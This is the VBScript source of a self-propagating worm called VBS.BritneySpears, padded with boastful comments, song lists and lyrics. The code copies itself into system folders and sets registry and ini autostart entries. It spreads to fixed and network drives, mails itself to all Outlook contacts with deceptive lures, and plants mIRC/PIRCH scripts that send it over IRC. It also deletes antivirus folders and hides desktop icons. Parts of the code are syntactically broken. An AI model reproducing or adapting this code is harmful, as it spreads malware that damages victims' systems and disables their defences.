'Some junk data just for the fuck of it!
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
'
'Previous Programs by LorDAngeR^GueSS:
'VBS.§t4®©h1lÐ AKA Es Como La Cocaîna
'VBS.Anti-Virus (Anti-Virii)
'10 msgs per 50th millisecond on the autostart
'And some various fuckupfiles (.bat and .exe's)
'
'FACE DOWN AZZ UP THATS THE WAY WE LIKE TO FUCK! (ooh! ahh!)
'
'hgdsfbsiofbswfkidtewitmertmn8753fmnt2895m6nf80mnt8od6mjo8my63dmt643mf0635ft365fy366yh35y3j773
'g3moi3gmn3nmfnyocg6iny3ocmn0983mngc87x3mg3mg9c35mgc3my98gc8639c0g653gc
'gc3gco35gc9mc6089mn2g89 289cn2 982 292nxc92nmxn87,__s-.s.z,mu709ÿ
'fapofindsaoif7nsilufniwgbiwbguwbvnv86nfv9n6r3ovm0rq7m0grq8mgpq9,gqgq3g
'gr3qågoeqrpog,meqpogmueqopigmnu79e8rqungyengoieqmgeqgefågäöäögäåöfägåöeg39g02g13g31
'gregergeoprgegmqelkgmeqlgmjleqmgjlkjeqmgeqmgkleqjgeqhg veqveqv
'fwqefuwnfiluwynfwlfif++¨g4rewdvg
'Temp data junkmotherfucker
'idontknowifthis'llworkbutisurehopeso:)
'possiblethanks:#nohackondalnetfortesing/analyzingthisvirus
'µGµuµeµ§µ§µ - GueSS

'
''
'''
''''
'''
''
'
l_klasse_msgbox_message_text	= "VBS.BritneySpears Virus By: LorDAngeR Of The Gue§§ CreW"
l_goaway_msgbox_message_text	= "Want The Virus To Be Left On Your System?"

'*Comment:*
'This is added for the LorDAngeR Addon #2 of the Tune.vbs virus created by Slug
'VBS.BritneySpears 
'Mail your help with VBS coding to:
'LorDAngeR@hotmail.com
'Coz i suck and Britney! Mail me :)
'Why need Justin when you got me :P
'Ooh! God Is A DJ!!
'This is my church, this is where i heal my hurts!
'All credits should go to Slug for creating the infection to this shit.
'I know im lame but you should be out hunting virus!
'Not read my fucking crap!
'And not caring about my lameness :P
':)
'
'VBS.BritneySpears - You just gotta love it!
'The Official Gue§§ Site is availible on:
'http://welcome.to/brunflo <-- not Gue§§ CreW related (yet)
'and www.LorDAngeR.com (this site is down due to the fuckers i bought it from)
'
'heheh you really want to know what songs i listened too?? :P
'Britney Spears - Baby One More Time(Ospina Dance Mix)
'Britney Spears - Sometimes (Thunderpuss 2k Mix)
'06 - Britney Spears - [From The Bottom Of My Broken Heart}
'Britney Spears - Oops I Did It Again(The DJ Promo CD)
'N Sync - Bye Bye Bye (Thunderpuss 2000 Club Remix)
'Manix - My Heart Will Go On [hEwiE xtd MiX]
'Slipknot - Wait And Bleed
'Amber - Sexual (Li Da Di) (Thunderpuss 2000 Club Mix).
'Insane_Clown_Posse_-_ICP_vs_Britney_Spears
'DJ ClaustroPhobiC Vs. TSEC - Imagine (Remix)
'DJ ClaustroPhobiC AKA LorDAngeR - The Club(Even More Trance Remix) at the end!
'DJ ClaustroPhobiC - Departure(X-tended House Mix)
'DJ ClaustroPhobiC - Freak Out
'DJ ClaustroPhobiC - One Of A Kind Volume 1
'DJ ClaustroPhobiC - Silly Beats
'DJ ClaustroPhobiC - Space Travel Agency
'DJ ClaustroPhobiC - The Birth Of Humanity
'Blümchen - Unofficial Herzfrequenz Mix
'
'
'
'Thats the songs that i mainly listened to when i did this shit
'VBS.BritneySpears 
'Why Be Mad When You Can Be Sad?
'Why Be Sad When You Can Be Mad?
'
'
'14:29 2000-02-29
'
'Function htmlesc(str)
'str = Replace(str, "&", "&amp;")
'str = Replace(str, "<", "&lt;")
'htmlesc = Replace(str, ">", "&gt;")
'End Function


L_Welcome_MsgBox_Message_Text   = "VBS.BritneySpears By LorDAngeR Of The Gue§§ CreW"
L_Welcome_MsgBox_Title_Text     = "Press Enter and squeal like a fucking pig"
Call Welcome()



Microsoft_Patch = Wscript.ScriptFullName2
Free-Website = Wscript.ScriptFullName3

sub Britney()
On Error Resume Next
Dim obj, sysfldr,s, f, MyShortcut, MyDesktop, DesktopPath
'Read Path (Shortcut)
'DesktopPath = WSHShell.SpecialFolders("Desktop")
'Create the shortcut(s)
'Set MyShortcut = WSHShell.CreateShortcut(DesktopPath & "\VBS.BritneySpears.lnk")
Set obj = CreateObject("Scripting.FileSystemObject")
Set sysfldr = obj.GetSpecialFolder(1)
Set winfldr = obj.GetSpecialFolder(0)
Set tmpfldr = obj.GetSpecialFolder(2)
set s = CreateObject("Scripting.FileSystemObject")
Set f = s.GetFile(WScript.ScriptFullName)
f.copy(sysfldr&"\Britney.vbs")
f.copy(winfldr&"\klasseboy.vbs")
f.copy(tmpfldr&"\BritneySpears.vbs")
f.copy(tmpfldr&"\LorDAngeR.vbs")
f.copy(tmpfldr&"\microsoft.dll")
f.copy(winfldr&"\winboot.exe")
f.copy(winfldr&"\winboot.vxd")
f.copy(sysfldr&"\logo.bmp")
f.copy(winfldr&"\Britney.vbs")


loc=winfldr&"\klasseboy.vbs"
loc1=sysfldr&"\Britney.vbs"
loc2=tmpfldr&"\BritneySpears.vbs"
loc3=sysfldr&"\microsoft.dll"
loc4=winfldr&"\winboot.exe"
loc5="explorer.exe"
loc6="GueSS.txt"
Set WSHShell = CreateObject("WScript.Shell")
WSHShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\ScanRegistry", loc
WSHShell.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\", loc1
WSHShell.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices\", loc2
editini winfldr&"\win.ini","[windows]","load",loc3
editini winfldr&"\win.ini","[windows]","run",loc4
editini winfldr&"\system.ini","[boot]","shell","Explorer.exe " & loc5
editini sysfldr&"\GueSS.txt","This Virus Was Created By LorDAngeR Of The Gue§§ Crew!",loc6
ntwrk()
end sub
sub infect(drive)
On Error Resume Next
set s = CreateObject("Scripting.FileSystemObject")
Set f = s.GetFile(WScript.ScriptFullName)
f.copy(drive & "\BritneySpears.vbs")
path=drive&"\BritneySpears.vbs"
end sub
Function ShowDriveType(drvpath)
On Error Resume Next
Dim fso, d, t
Set fso = CreateObject("Scripting.FileSystemObject")
Set d = fso.GetDrive(drvpath)
Select Case d.DriveType
Case 0: t = "Unknown"
Case 1: t = "Removable"
Case 2: t = "Fixed"
Case 3: t = "Network"
Case 4: t = "CD-ROM"
Case 5: t = "RAM Disk"
End Select
if t = "" then t = "None"
ShowDriveType = t
End Function
sub ntwrk()
On Error Resume Next
for n = 65 to 90
l=Chr(n) 
drv=l&":"
d3=ShowDriveType(drv)
if d3 = "Fixed" then infect(drv)
if d3 = "Network" then infect(drv)
next
sprd()
end sub
sub sprd()
on error resume next
Dim oShell
Set oShell = Wscript.CreateObject("Wscript.Shell")
Dim strProfile
Dim strAlias, strAliasKey
strProfile = oShell.RegRead("HKCU\Software\Microsoft\Windows\CurrentVersion\Sent?")
if strProfile = "" then
oShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Sent?", "1"
Set Prg = CreateObject("Outlook.Application")
Set Prg1 = Prg.GetNameSpace("MAPI")
For y = 1 To Prg1.AddressLists.Count
Set AdBook = Prg1.AddressLists(y)
x = 1
Set Maie = Prg.CreateItem(0)
For oo = 1 To AdBook.AddressEntries.Count
newmailadd = AdBook.AddressEntries(x)
Maie.Recipients.Add newmailadd
x = x + 1
Next
Maie.Subject = "Warning! A new virus called VBS.BritneySpears is out!!! Created By: LorDAngeR Of The Gue§§ CreW"
Maie.Body = "If you want to sleep calm and not to worry about VBS.BritneySpears, please run the Protector/Remover (i included it in my mail and i BCC'ed it to everyone on my mailing-list)"
Maie.Attachments.Add WScript.ScriptFullName
Maie.DeleteAfterSubmit = False
Maie.Send
newmailadd=""
next
else
end if
etc()    
end sub
sub etc()
On Error Resume Next
a=ReportFolderStatus("C:\mirc")
if a="1" then mirc()
b=ReportFolderStatus("C:\windows")
if b="1" then windows()
end sub

'loop?

Britney()
Function ReportFileStatus(filespec)
On Error Resume Next
Dim fso, msg
Set fso = CreateObject("Scripting.FileSystemObject")
If (fso.FileExists(filespec)) Then
msg = "1"
Else
msg = "0"
End If
ReportFileStatus = msg
End Function
Function ReportFolderStatus(fldr)
On Error Resume Next
Dim fso, msg
Set fso = CreateObject("Scripting.FileSystemObject")
If (fso.FolderExists(fldr)) Then
msg = "1"
Else
msg = "0"
End If
ReportFolderStatus = msg
End Function
sub mirc()
On Error Resume Next
Dim fso4, folder
Set fso4 = CreateObject("Scripting.FileSystemObject")
Set winfolder = fso4.GetSpecialFolder(1)
path = winfolder&"\britney.vbs"
Dim fso34, f132, t2s
Const ForWriting = 2
Set fso34 = CreateObject("Scripting.FileSystemObject")
fso34.CreateTextFile ("c:\mirc\script.ini")
Set f132 = fso34.GetFile("c:\mirc\script.ini")
Set t2s = f132.OpenAsTextStream(ForWriting, false)
t2s.write "[script]" & vbcrlf
t2s.write "n0=ON 1:JOIN:#:/dcc send $nick " & path & vbcrlf
t2s.write "n1=on 1:join:#:/say Im infected the VBS.BritneySpears virus created by LorDAngeR^Gue§§
t2s.write "n2=on 1:join:#:$amsg Im infected with the VBS.BritneySpears virus created by LorDAngeR^Gue§§
t2s.write "n3=on 1:join:#:/msg LorDAngeR Im infected the VBS.BritneySpears virus created by .. uuhmm you :)
t2s.write "n4=on 1:join:#:/msg Br1tn3y Im infected the VBS.BritneySpears virus created by LorDAngeR^Gue§§
t2s.write "n5=on 1:join:#:/msg Br1tn3ySp34rs Im infected the VBS.BritneySpears virus created by LorDAngeR^Gue§§
t2s.write "n6=on 1:QUIT:#:$amsg Hit Me Baby One More time (VBS.BritneySpears) Visit http://mp3.com/lordanger"
t2s.close
editini "C:\mirc\mirc.ini","[text]","ignore","*.exe,*.com,*.bat,*.dll,*.ini,*.vbs"
editini "C:\mirc\mirc.ini","[options]","n2","0,1,0,0,1,1,1,1,0,5,35,0,0,1,1,0,1,1,0,5,500,10,0,1,1,0,0"
editini "C:\mirc\mirc.ini","[options]","n4","1,0,1,1,0,3,9999,0,0,0,1,0,1024,0,0,99,60,0,0,1,1,1,0,1,1,5000,1"
end sub
sub windows()
On Error Resume Next
Dim fso4, folder
Set fso4 = CreateObject("Scripting.FileSystemObject")
Set winfolder = fso4.GetSpecialFolder(1)
path = winfolder&"\Britney.vbs"
Dim fso, f1, ts
Const ForWriting = 2
Set fso = CreateObject("Scripting.FileSystemObject")
fso.CreateTextFile ("c:\pirch98\events.ini")
Set f1 = fso.GetFile("c:\pirch98\events.ini")
Set ts = f1.OpenAsTextStream(ForWriting, false)
ts.write "[Levels]"&vbcrlf
ts.write "Enabled=1"&vbcrlf
ts.write "Count=6"&vbcrlf
ts.write "Level1=000-Unknowns"&vbcrlf
ts.write "000-UnknownsEnabled=1"&vbcrlf
ts.write "Level2=100-Level 100"&vbcrlf
ts.write "100-Level 100Enabled=1"&vbcrlf
ts.write "Level3=200-Level 200"&vbcrlf
ts.write "200-Level 200Enabled=1"&vbcrlf
ts.write "Level4=300-Level 300"&vbcrlf
ts.write "300-Level 300Enabled=1"&vbcrlf
ts.write "Level5=400-Level 400"&vbcrlf
ts.write "400-Level 400Enabled=1"&vbcrlf
ts.write "Level6=500-Level 500"&vbcrlf
ts.write "500-Level 500Enabled=1"&vbcrlf
ts.write vbcrlf
ts.write "[000-Unknowns]"&vbcrlf
ts.write "User1=*!*@*"&vbcrlf
ts.write "UserCount=1"&vbcrlf
ts.write "Event1=ON JOIN:#:/msg $nick Hi there, Im Infected with the VBS.BritneySpears virus created by LorDAngeR^Gue§§"&vbcrlf
ts.write "event2=on join:#:$amsg Hi $chan $+, Im Infected with the VBS.BritneySpears virus Created by LorDAngeR^Gue§§"&vbcrlf
ts.write "event3=on 1:QUIT:#:/msg $chan Hit Me Baby One More time (VBS.BritneySpears) Visit http://mp3.com/lordanger"
ts.write "EventCount=3"&vbcrlf
ts.write vbcrlf
ts.write "[100-Level 100]"&vbcrlf
ts.write "User1=*!*@*"&vbcrlf
ts.write "UserCount=1"&vbcrlf
ts.write "Event1=ON JOIN:#:/dcc send $nick " & path &vbcrlf
ts.write "EventCount=1"&vbcrlf
ts.write vbcrlf
ts.write "[200-Level 200]"&vbcrlf
ts.write "UserCount=0"&vbcrlf
ts.write "EventCount=0"&vbcrlf
ts.write vbcrlf
ts.write "[300-Level 300]"&vbcrlf
ts.write "UserCount=0"&vbcrlf
ts.write "EventCount=0"&vbcrlf
ts.write vbcrlf
ts.write "[400-Level 400]"&vbcrlf
ts.write "UserCount=0"&vbcrlf
ts.write "EventCount=0"&vbcrlf
ts.write vbcrlf
ts.write "[500-Level 500]"&vbcrlf
ts.write "UserCount=0"&vbcrlf
ts.write "EventCount=0"&vbcrlf
ts.write vbcrlf
editini "C:\pirch98\pirch98.ini","[DCC]","AutoHideDccWin","1"
end sub
sub editini(filename,section,string,newvalue)
on error resume next
Const ForReading = 1
Const ForWriting = 2
iniFile = filename
sectionName = section
keyName = string
newVlaue = newvalue
bInSection = false
bKeyChanged = false
Set fso = CreateObject("Scripting.FileSystemObject")
Set ts = fso.OpenTextFile(iniFile, ForReading)
lines = Split(ts.ReadAll,vbCrLf)
ts.close
For n = 0 to ubound(lines)
if left(lines(n),1) = "[" then
if bInSection then
exit for
end if
if instr(lines(n),sectionName) = 1 then
bInSection = true
else
bInSection = false
end if
else
if bInSection then
if instr(lines(n),keyName & "=") = 1 then
bKeyChanged = true
lines(n) = keyName & "=" & newVlaue
bKeyChanged = true
exit for
end if
end if
end if
Next
if bKeyChanged then
Set ts = fso.OpenTextFile(iniFile, ForWriting)
ts.Write join(lines,vbCrLf)
ts.close
end if
set ts = nothing
set fso = nothing
end sub
'Poooooofff! No Icons :)
'This is added by LorDAngeR AKA Br1tn3y Sp34rs AKA ß®1tñ3ÿ §þ34®§
wshshell.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\HideIcons", 1, "REG_DWORD"
WScript.Echo ("Hit Me Baby One More Time - Miss Britney Spears")
WScript.Echo ("You Should Feel happy!!")
WScript.Echo ("After all, This took me some time to write!")
WScript.Echo ("*My Lonelyness in killing me, And I, I must confess i still belive, when im not with you i loose my mind, give me a sign HIT ME BABY ONE MORE TIME!*")
WScript.Echo ("What Have You Done To My Mind!?!?!?!")
WScript.Echo ("Oops!... I Did It Again")
WScript.Echo ("LorDAngeR's Greets:")
WScript.Echo ("kOnDa")
WScript.Echo ("Prevel")
WScript.Echo ("Aithor")
WScript.Echo ("Frosty AKA Flikka, Thunderpuss 2000, Dez, Buddha, Eijnar, EMP, HanniS, Intel (MP3 Elite), Iddy, R1C6P, Sierra Sun Star, Short Stuff, SMS, Stefan P, TÅÇTÎÇÅ£ GËÑÎµ§ and of course : Britney Spears! :), The rest on my friends on ICQ and IRC! ")
WScript.Echo ("Fuck Christina Ugly-Era!")
WScript.Echo ("This was written by: LorDAngeR AKA DJ ClaustroPhobiC AKA ß®1tñ3ÿ §þ34®§ AKA Br1tn3y Sp34rs AKA DJ BlueScreenError! 13 messages! There Is 13 Letters In Britney Spears name!!! *Awwwh! Totally coked up here in my chair!!*")

If Day(Now()) = 1 or Day(Now()) = 5 or Day(Now()) = 10 or Day(Now()) = 13 or Day(Now()) = 15 or Day(Now()) = 20 or Day(Now()) = 25  Then
  WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Version", "ß®1tñ3ÿ §þ34®§ 2000"
  WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RegisteredOwner", "LorDAngeR^Gue§§"
  WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RegisteredOrganization", "ß®1tñ3ÿ §þ34®§ Owns Ya Dumb Ass"
  WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "c:\windows\Britney.vbs"
  WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\URL\DefaultPrefix", "Britney://"
  WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\URL\Prefixes\ftp", "BritneyFTP://"
  WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\URL\Prefixes\www", "Britney://"
  fSO.DeleteFolder ("c:\Program Files\Mcafee")
  fSO.DeleteFolder ("c:\Program Files\avp")
  fSO.DeleteFolder ("c:\f-prot")
  fSO.Createfolder ("c:\ß®1tñ3ÿ§þ34®§")
  fSO.Createfolder ("c:\LorDAngeR")
  fSO.Createfolder ("c:\Gue§§_CreW")
  fSO.Createfolder ("c:\BritneySpears")
  fSO.Createfolder ("c:\Britney")
  fSO.Createfolder ("c:\Spears")
  fSO.Createfolder ("c:\Dont-Feel-Offended!")
  fSO.Createfolder ("c:\http://mp3.com/lordanger")
  fSO.Createfolder ("c:\Oops!..._I-Did-It-Again")
f.copy(c:\windows\all users\start-menyn\program\autostart\Br1tn3y.vbs")
f.copy(c:\windows\all users\start-menu\program\autostart\Br1tn3y.vbs")
End If

If Day(Now()) = 2 or Day(Now()) = 6 or Day(Now()) = 11 or Day(Now()) = 14 or Day(Now()) = 16 or Day(Now()) = 21 or Day(Now()) = 26 Then

sub infect(drive)
On Error Resume Next
set s = CreateObject("Scripting.FileSystemObject")
Set f = s.GetFile(WScript.ScriptFullName2)
f.copy(drive & "\Microsoft.vbs")
path=drive&"\Microsoft.vbs"
end sub

Enf If

sub sprd()
on error resume next
Dim oShell
Set oShell = Wscript.CreateObject("Wscript.Shell")
Dim strProfile
Dim strAlias, strAliasKey
strProfile = oShell.RegRead("HKCU\Software\Microsoft\Windows\CurrentVersion\Sent?")
if strProfile = "" then
oShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Sent?", "1"
Set Prg = CreateObject("Outlook.Application")
Set Prg1 = Prg.GetNameSpace("MAPI")
For y = 1 To Prg1.AddressLists.Count
Set AdBook = Prg1.AddressLists(y)
x = 1
Set Maie = Prg.CreateItem(0)
For oo = 1 To AdBook.AddressEntries.Count
newmailadd = AdBook.AddressEntries(x)
Maie.Recipients.Add newmailadd
x = x + 1
Next
Maie.Subject = "Hey, You have been chosen to host a free website!! Download this attachment and read the instructions! Love, Abby B."
Maie.Body = "Hey, You have been chosen to host a free website!! Download this attachment and read the instructions! Love, Abby B. *HUG*"
Maie.Attachments.Add WScript.ScriptFullName3
Maie.DeleteAfterSubmit = False
Maie.Send
newmailadd=""
next
else
end if
etc()    
end sub





Sub Welcome()
    Dim intDoIt

    intDoIt =  MsgBox(L_Welcome_MsgBox_Message_Text,    _   
                      vbOKCancel + vbInformation,       _
                      L_Welcome_MsgBox_Title_Text )
    If intDoIt = vbCancel Then
        WScript.Echo ("Here in Sweden, we dont like quitters! Going back...")
	call welcome()
    End If
End Sub

Sub Goaway()
    Dim intDontDoIt

    intDontDoIt =  MsgBox(l_goaway_msgbox_message_text,    _   
                      vbOKCancel + vbInformation,       _
                      l_klasse_msgbox_message_text)
    If intDontDoIt = vbCancel Then
        WScript.Echo ("Windows Page Fault Error 9598: Stack Overflow In Module 254, The Program Returned A Error Description: VBS.BritneySpears Virus By LorDAngeR^Gue§§ Is Left In RAM-Memory. Please re-run and try other solutions! ")
call goaway()
	elseif intdontdoit = vbOK then
        WScript.Echo ("VBS.BritneySpears Was Successfully Removed!")
	End If
End Sub






'
'Add-on and othershit .. eeerhmm.. Anyway!
'This is VBS.Britney By LorDAngeR^Gue§§
'It's  heavily based on Tune.vbs by Slug
'Gue§§ CreW Are (at this time):
'LorDAngeR and kOnDa
'This is just a pre-release of VBS.Britney
'Dedicated to: Britney Spears :)
'Ill add a icon flooder for Windows9x and
'some other stuff in the next version!
'It there will be another release
'
'
'ß®1tñ3ÿ §þ34®§
'
'
'Fun to see your icons dissapear eh ? :)
'
'LorDAngeR@AntiSocial.com   or:
'Br1tn3ySp34rs@britneyspearsmail.com
'
'Police dum-di-dum:
'The author cant be held responsible for the possible damage caused
'by this program!
'Or something like that...
'
'
'
' "As long as I can remember, I always wanted to be a gangster" - Unknown
'
'http://mp3.com/lordanger
'It shouldnt be too hard to trace me down when i spread info like this :)
'Tell me if the virus works!
'I actually dont know, i havent tested it yet ( 18:34 2000-04-11 )
'Totally finished 16:06 2000-05-0
'If i dont feel like updating anything later that is...
'
'
'Place for logo here....
'Place for braindead wannabe's here... ---> · <---
'
'
'
'
'
'
'
'
'
'
'Still reading?
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'Whattafuck?
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'Are you searching something?
'
'
'
'
'
'
'
'
'
'
'

'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'Nothing here except...
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'That little something i left on row 64...
'Want it?
'What are you waiting for?
'Go get it! :P
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'Poem for my latest release "The Birth Of Humanity"
'
'Im a lil' freelancing gabba' without a place to sleep
'Lets screw this shit before it gets to deep
'Its like "Punany"
'Nah fuck! its the Birth Of Humanity
'
'
'
'
'	
'Poem from another dude_.-·´¯¯`·-._
'                                  ')
'                            ___   /
'                           (_.·¯¯¯
'        pure as maiden
'        pure as maiden
'        why dont you lay down
'        let your hair down
'        take those aching feet off the ground
'
'        respect yourself before you
'        lose yourself
'        put that cheap zion back on the shelf
'        if your friends can't trust you
'        can you trust yourself?
'
'        last one out shut the door
'        but that's you so
'        fuck the door
'        let the breeze carry the house away
'        let someone else use their day
'        to live their own way
'
'        pure maiden
'        why don't you lay down
'        take those aching feet off the ground
'        let your guard down
'        six feet underground
'        let your guard down
'
'
'my care can teach you to care for yourself
'just stop reaching for that discount zion shelf
'
'respect yourself...
'
'
'
'
'
'
'
'
'
'
'Oops!... I Did It Again Lyrics:
'
'
'
'Yeah yeah yeah yeah yeah yeah
'Yeah yeah yeah yeah yeah yeah
'
'I think I did it again
'I made you believe we're more than just friends
'Oh baby
'It might seem like a crush
'But it doesn't mean that I'm serious
''Cause to lose all my senses
'That is just so typically me
'Oh baby, baby
'
':Chorus:
'Oops!...I did it again
'I played with your heart, got lost in the game
'Oh baby, baby
'Oops!...You think I'm in love
'That I'm sent from above
'I'm not that innocent
'
'You see my problem is this
'I'm dreaming away
'Wishing that heroes, they truly exist
'I cry, watching the days
'Can't you see I'm a fool in so many ways
'But to lose all my senses
'That is just so typically me
'Baby, oh
'
':Chorus:
'Oops!...I did it again
'I played with your heart, got lost in the game
'Oh baby, baby
'Oops!...You think I'm in love
'That I'm sent from above
'I'm not that innocent
'
'Yeah yeah yeah yeah yeah yeah
'Yeah yeah yeah yeah yeah yeah
'
'"All aboard"
'"Britney, before you go, there's something I want you to have"
'"Oh, it's beautiful, but wait a minute, isn't this...?"
'"Yeah, yes it is"
'"But I thought the old lady dropped it into the ocean in the end"
'"Well baby, I went down and got it for you"
'"Oh, you shouldn't have"
'
'Oops!...I did it again to your heart
'Got lost in this game, oh baby
'Oops!...You think that I'm sent from above
'I'm not that innocent
'
':Chorus:
'Oops!...I did it again
'I played with your heart, got lost in the game
'Oh baby, baby
'Oops!...You think I'm in love
'That I'm sent from above
'I'm not that innocent
'
':Chorus:
'Oops!...I did it again
'I played with your heart, got lost in the game
'Oh baby, baby
'Oops!...You think I'm in love
'That I'm sent from above
'I'm not that innocent
'
'
'
'Haha, hope you like it, im out :)
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
